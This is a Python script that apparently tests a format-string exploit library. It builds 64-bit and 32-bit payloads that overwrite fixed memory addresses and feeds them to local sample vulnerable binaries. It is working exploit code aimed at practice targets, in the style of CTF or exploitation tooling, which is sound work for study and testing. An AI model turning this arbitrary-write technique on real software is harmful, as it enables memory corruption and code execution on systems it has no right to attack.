from fmtstr import FormatString, p64
from subprocess import Popen, PIPE

print('-- now test 64bit')

fmt = FormatString(offset=6, written=0, bits=64)
fmt[0x601040] = 0x1234567890abcdef
payload, sig = fmt.build()

print('payload: %r' % payload)
print('sig: %r' % sig)

io = Popen('./sample/sample-fmt', stdin=PIPE, stdout=PIPE)
io.stdin.write(payload + b'\n')
io.stdin.flush()
io.stdin.close()
buff = b''
while sig not in buff:
    buff += io.stdout.read(1)

print(io.stdout.readline())
io.kill()








print('-- now test 32bit')

fmt = FormatString(offset=7, written=2, bits=32)
fmt[0x804a020] = p64(0xffeebbddaa335588)
payload, sig = fmt.build()

print('payload: %r' % payload)
print('sig: %r' % sig)

io = Popen('./sample/sample-fmt-32', stdin=PIPE, stdout=PIPE)
io.stdin.write(b'zz' + payload + b'\n')
io.stdin.flush()
io.stdin.close()
buff = b''
while sig not in buff:
    buff += io.stdout.read(1)

print(io.stdout.readline())
io.kill()
